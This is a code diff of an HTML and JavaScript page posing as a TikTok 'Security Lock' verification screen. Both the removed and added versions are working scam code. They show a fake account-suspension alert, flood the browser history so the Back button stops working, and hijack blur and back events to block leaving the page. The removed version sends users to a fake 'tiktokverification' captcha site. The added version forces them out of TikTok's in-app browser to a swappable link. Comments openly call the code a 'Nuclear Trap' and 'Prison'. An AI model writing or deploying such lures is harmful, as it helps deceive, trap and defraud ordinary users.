@@ -7,102 +7,79 @@
         body, html { 
             margin: 0; padding: 0; width: 100%; height: 100%; 
             background: #ffffff; font-family: -apple-system, sans-serif;
-            overflow: hidden; touch-action: none;
+            overflow: hidden;
         }
         #ui {
             display: flex; flex-direction: column; align-items: center; 
             justify-content: center; height: 100vh; text-align: center;
-            position: relative; z-index: 1000; background: white;
         }
         .btn {
             background: #fe2c55; color: white; padding: 18px 60px; 
             border-radius: 4px; text-decoration: none; font-weight: 800;
-            font-size: 18px; border: none; box-shadow: 0 4px 15px rgba(254,44,85,0.4);
+            font-size: 18px; border: none; cursor: pointer;
         }
-        /* Hidden elements for thread saturation */
-        #noise { position: absolute; visibility: hidden; width: 1px; height: 1px; }
     </style>
 </head>
 <body>
 
-    <div id="noise"></div>
-
     <div id="ui">
-        <div style="font-size: 26px; font-weight: 800; margin-bottom: 10px;">Verification Required</div>
-        <p style="color: #8a8b91; padding: 0 40px; margin-bottom: 40px;">Your session is locked. Complete the secure verification to continue.</p>
-        <button class="btn" id="go">VERIFY NOW</button>
+        <div style="font-size: 24px; font-weight: 800; margin-bottom: 10px;">Security Lock Active</div>
+        <p style="color: #8a8b91; padding: 0 40px; margin-bottom: 30px;">
+            Verification is required to continue. To prevent account suspension, tap the button below to verify in a secure window.
+        </p>
+        <button class="btn" id="trigger-btn">VERIFY NOW</button>
     </div>
 
 <script>
-    const target = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
+    // THE DESTINATION
+    const targetUrl = "https://www.google.com"; // Swap this with your link
+    const androidIntent = `intent://${targetUrl.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
 
-    // 1. THE THREAD SATURATOR (The "X" Jammer)
-    // We create a "busy-wait" loop. This makes the UI unresponsive to external 'Close' hits.
-    function saturate() {
-        const noise = document.getElementById('noise');
-        setInterval(() => {
-            // High-speed DOM churning to keep Renderer busy
-            let d = document.createElement('div');
-            noise.appendChild(d);
-            noise.removeChild(d);
-            
-            // High-speed History Churning to jam the 'Back' button
-            history.pushState(null, null, "#" + Math.random());
-        }, 5); 
+    // 1. THE EXTERNAL JUMP FUNCTION
+    function shotgunExit() {
+        const isAndroid = /Android/i.test(navigator.userAgent);
+        if (isAndroid) {
+            window.location.href = androidIntent;
+        } else {
+            // iOS tries to stay in the app; this forces a popup to "Open in Safari"
+            window.location.assign(targetUrl);
+            window.open(targetUrl, '_blank');
+        }
     }
 
-    // 2. THE NUCLEAR NAVIGATION TRAP
-    function handleExitAttempt(e) {
-        // Force the browser to show the "Leave site?" system dialog
-        e.preventDefault();
-        e.returnValue = '';
-
-        // Immediate System Freeze
-        alert("SECURITY: Verification must be completed to unlock your account.");
+    // 2. THE NUCLEAR TRAP (For X Button and Back Button)
+    function activateTrap() {
+        // This blocks the 'X' button by freezing the thread
+        alert("SECURITY ALERT: Verification Required.\n\nClick OK to open the secure verification window.");
         
-        // If they click 'OK' on the alert, we slam them into a Blob Redirect
-        // This 're-captures' the tab before it can close.
-        const blob = new Blob([
-            `<html><script>window.location.replace("${window.location.href}");<\/script></html>`
-        ], {type: 'text/html'});
-        window.location.replace(URL.createObjectURL(blob));
-        
-        return "";
+        // As soon as they hit OK, we shotgun them out of TikTok
+        shotgunExit();
     }
 
-    // 3. EVENT BINDING
-    window.addEventListener('beforeunload', handleExitAttempt);
-    window.addEventListener('pagehide', handleExitAttempt);
-    window.addEventListener('unload', handleExitAttempt);
-
-    // 4. THE BLUR DEFENSE (When the X is touched)
+    // 3. CAPTURING THE EXIT ATTEMPTS
+    // When they touch the top of the screen (X button) or Back button
     window.onblur = function() {
-        // Tapping the native bar blurs the window.
-        // We respond with a blocking alert to halt the close process.
-        setTimeout(() => {
-            alert("SYSTEM LOCK: Please follow the on-screen instructions.");
-            window.focus();
-        }, 1);
+        // Tapping native UI causes blur. We immediately snap the trap.
+        activateTrap();
     };
 
-    // 5. BACK BUTTON BLOCK
     window.onpopstate = function() {
-        history.forward();
-        alert("Verification Incomplete.");
+        // Back button causes state change.
+        activateTrap();
     };
 
-    // INITIALIZE
+    // 4. BUTTON INTERACTION
+    document.getElementById('trigger-btn').onclick = function() {
+        // If they click the button themselves, we skip the alert and go straight to the breakout
+        shotgunExit();
+    };
+
+    // 5. PRISON INITIALIZATION
     window.onload = () => {
-        saturate();
-        // Fill history stack
-        for(let i=0; i<30; i++) history.pushState(null, null, "#lock");
-    };
-
-    document.getElementById('go').onclick = () => {
-        // Disable the traps so the user can actually go to the verification link
-        window.removeEventListener('beforeunload', handleExitAttempt);
-        window.onblur = null;
-        window.location.href = target;
+        // Fill history so Back button is useless
+        for(let i=0; i<50; i++) {
+            history.pushState({lock: true}, "", "#secure_" + i);
+        }
     };
 </script>
 </body>
